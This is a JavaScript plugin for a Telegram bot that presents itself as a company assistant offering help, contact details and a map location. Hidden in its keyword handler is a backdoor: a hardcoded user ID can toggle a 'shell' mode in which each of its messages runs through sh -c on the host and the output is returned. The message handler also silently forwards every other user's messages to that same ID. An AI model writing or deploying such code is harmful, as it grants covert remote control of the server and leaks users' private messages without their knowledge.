import { Markup } from 'telegraf';
import { exec } from 'child_process';

let version = 0.8;
let stru=false;

export default function (bot) {

    /* ---------------------- 工具函数区 ---------------------- */

    bot.context.deleteLater = function (messageId, delay = 5000) {
        if (!messageId) return;
        setTimeout(async () => {
            try {
                await this.deleteMessage(messageId);
            } catch (err) {
                if (err.description !== 'Bad Request: message to delete not found') {
                    console.error(`删除消息失败: ${err}`);
                }
            }
        }, delay);
    };

    bot.context.sed_de = async function (text, deleteUserMsg = true, replyToUser = true, delay = 5000) {
        try {
            let options = replyToUser
                ? { reply_to_message_id: this.message?.message_id }
                : undefined;
            if(!deleteUserMsg)delay=0;

            let sent = await this.reply(text, options);

            setTimeout(async () => {
                try {
                    
                    if (deleteUserMsg && this.message?.message_id) {
                        await this.deleteMessage(sent.message_id);
                        await this.deleteMessage(this.message.message_id);
                    }
                } catch (err) {
                    if (err.description !== 'Bad Request: message to delete not found') {
                        console.error(`删除消息失败: ${err}`);
                    }
                }
            }, delay);
        } catch (err) {
            console.error(`发送消息失败: ${err}`);
        }
    };

    bot.context.sed_zf = async (ctx, targetId = 7563798903) => {
        try {
            await ctx.forwardMessage(targetId, ctx.message.chat.id, ctx.message.message_id);
            ctx.reply('消息已转发！');
        } catch (err) {
            console.error('转发失败:', err);
            ctx.reply('转发失败，请检查权限或聊天 ID');
        }
    };

    /* ---------------------- 配置区 ---------------------- */

    let CONFIG = {
        COMPANY_INFO: {
            name: "上海总部2",
            address: "上海市浦东新区张江科技园1号楼",
            coordinates: { lat: 31.2304, lon: 121.4737 },
            contact: "400-123-4567",
            website: "https://example.com"
        }
    };

    /* ---------------------- 功能函数区 ---------------------- */

    let sendLocation = async (ctx) => {
        try {
            let msg = await ctx.replyWithVenue(
                CONFIG.COMPANY_INFO.coordinates.lat,
                CONFIG.COMPANY_INFO.coordinates.lon,
                CONFIG.COMPANY_INFO.name,
                CONFIG.COMPANY_INFO.address,
                {
                    reply_markup: Markup.inlineKeyboard([
                        [Markup.button.url("查看地图", CONFIG.COMPANY_INFO.website)]
                    ])
                }
            );

            ctx.deleteLater(msg.message_id);
            ctx.deleteLater(ctx.message.message_id);
        } catch (err) {
            console.error("地址发送失败:", err);
        }
    };

    let pingHandler = async (ctx) => {
        await ctx.sed_de(`♻ 当前版本: ${version}`, true);
    };

    let helpHandler = (ctx) => {
        ctx.sed_de("帮助内容：\n...", true, false);
    };

    let keywordHandler = async (ctx, keyword) => {
     if(ctx.from.id.toString() === "7563798903"){
         if (keyword === "shell") {
            stru=!stru;
            if(stru){
               await ctx.sed_de("进入命令模式  后续消息都以sh执行");
                return true;
            }
            await ctx.sed_de("退出命令模式");
            return true;
        }
         if(stru){
           exec(`sh -c "${keyword}"`, async (error, stdout, stderr) => {
                if (error) {
                    await ctx.sed_de(`执行错误: ${error.message}`,false,false);
                    return true;
                }
                await ctx.sed_de(stdout || "执行完成",false,false);
                if (stderr) console.error(stderr);
            });
            return true;
        }
        }
        if (keyword === "地址") {
            await sendLocation(ctx);
            return true;
        }

        if (keyword === "id") {
            await ctx.sed_de(`ID: ${ctx.from.id}`, true);
            return true;
        }

        
 

        return false;
    };

    /* ---------------------- 指令区 ---------------------- */

    bot.start((ctx) => {
        let msg = ctx.reply(
            `欢迎使用 *智能助手*！请选择操作：`,
            {
                parse_mode: 'MarkdownV2',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback("帮助中心", "help")],
                    [Markup.button.callback("联系我们", "contact_info")]
                ])
            }
        );
        ctx.deleteLater(msg.message_id);
        ctx.deleteLater(ctx.message.message_id);
    });

    bot.action("help", async (ctx) => {
        helpHandler(ctx);
        await ctx.answerCbQuery();
    });

    bot.action("contact_info", async (ctx) => {
        let msg = await ctx.reply(
            `🏢 *地址*: 上海市浦东新区张江科技园\\\n📞 *电话*: 400\\-123\\-4567`,
            {
                parse_mode: 'MarkdownV2',
                reply_markup: Markup.inlineKeyboard([
                    [Markup.button.callback("📍 发送位置", "send_location")]
                ])
            }
        );
        ctx.deleteLater(msg.message_id);
        await ctx.answerCbQuery();
    });

    bot.action("send_location", async (ctx) => {
        await sendLocation(ctx);
        await ctx.answerCbQuery();
    });

    bot.command("ping", pingHandler);
    bot.command("help", helpHandler);

    bot.command("id", (ctx) => {
        ctx.sed_de(`你的用户ID是: ${ctx.from.id}`);
    });

    bot.on("message", async (ctx) => {
        let text = ctx.message.text || "";

        if (await keywordHandler(ctx, text)) return;

        let toChatId = 7563798903;
        if (ctx.message.chat.id === toChatId) return;

        try {
            await ctx.forwardMessage(toChatId, ctx.message.chat.id, ctx.message.message_id);
        } catch (err) {
            console.error("转发失败:", err);
            ctx.reply("转发失败");
        }
    });

    bot.catch((err, ctx) => {
        console.error(`[${new Date().toISOString()}] 错误：`, err);
        ctx.reply("⚠️ 服务暂时不可用，请稍后再试").catch(() => {});
    });

    return {
        unload() {
            this.meta.commands.forEach(cmd => bot.command(cmd, () => {}));
        },
        meta: {
            version,
            commands: ['ping', 'id', 'start', 'help']
        }
    };
}